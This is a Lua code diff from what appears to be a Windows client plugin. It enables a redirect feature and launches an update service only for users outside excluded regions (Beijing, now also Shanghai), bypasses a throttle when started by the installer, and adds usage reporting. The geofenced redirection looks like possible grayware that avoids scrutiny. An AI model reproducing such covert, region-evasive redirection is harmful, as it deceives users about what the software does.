@@ -179,7 +179,7 @@ function Sunccess(strProvince,strCity)
 	
 		local tBlackCity = {
 			["exclude"] = {
-					["p"] = {"北京"},
+					["p"] = {"北京","上海"},
 				}, 
 		}
 		
@@ -239,7 +239,7 @@ end
 --重定向业务	
 function DoRedirect(strProvince,strCity,tBlackCity)
 	if CheckIsInZone(strProvince,strCity,tBlackCity) then
-		Log("[Sunccess] EnableRedirect.")
+		Log("[Sunccess] EnableR")
 		apiUtil:EnableRedirect(true)
 		
 		ReportReirectOpen()			--上报重定向开启
@@ -265,13 +265,36 @@ function DoRedirect(strProvince,strCity,tBlackCity)
 		Log("[DoRedirect] in black city")
 	end
 end
+
+function GetCommandStrValue(strKey)
+	local bRet, strValue = false, nil
+	local cmdString = apiUtil:GetCommandLine()
 	
+	if string.find(cmdString, strKey .. " ") then
+		local cmdList = apiUtil:CommandLineToList(cmdString)
+		if cmdList ~= nil then	
+			for i = 1, #cmdList, 1 do
+				local strTmp = tostring(cmdList[i])
+				if strTmp == strKey 
+					and not string.find(tostring(cmdList[i + 1]), "^/") then		
+					bRet = true
+					strValue = tostring(cmdList[i + 1])
+					break
+				end
+			end
+		end
+	end
+	return bRet, strValue
+end
 	
 --拉服务项的业务
 function DoLaunchAI(strProvince,strCity, tBlackCity)
-	if not CheckAiSvcsHist() then
-		Log("[DoLaunchAI] CheckAiSvcsHist failed")
-		return
+	local bRet1, strSource = GetCommandStrValue("/sstartfrom")
+	if not bRet1 or strSource ~= "installfinish" then--win7下安装包拉起忽略时间间隔判断
+		if not CheckAiSvcsHist() then
+			Log("[DoLaunchAI] CheckAiSvcsHist failed")
+			return
+		end
 	end
 
 	if not CheckIsInZone(strProvince,strCity,tBlackCity) then
@@ -280,16 +303,26 @@ function DoLaunchAI(strProvince,strCity, tBlackCity)
 	end
 
 	local bret = apiUtil:LaunchUpdate()
+	ReportLaunchAI(bret)
 	Log("[DoLaunchAI] LaunchUpdate bret:"..tostring(bret))
 	WriteAiSvcsHistory()
 end
 
+function ReportLaunchAI(bSuccess)	
+	local tStatInfo = {}
+
+	tStatInfo.strEC = "launchai"  --进入上报
+	tStatInfo.strEA = FunctionObj.GetGSMinorVer() or ""
+	tStatInfo.strEL = bSuccess and 1 or 0
+	
+	FunctionObj.TipConvStatistic(tStatInfo)
+end
 
 function CheckAiSvcsHist()
 	local tServerParam = LoadServerConfig() or {}
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
 	local nLaunchAiSvcTime = tUserConfig["nLaunchAiSvcTime"] or 0
-	local nSpanTimeInSec = tServerParam["nAISpanTimeInSec"] or 3*24*3600
+	local nSpanTimeInSec = tServerParam["nAISpanTimeInSec"] or 2*24*3600
 	local nCurrentTime = apiUtil:GetCurrentUTCTime()
 
 	if math.abs(nCurrentTime-nLaunchAiSvcTime) > nSpanTimeInSec then
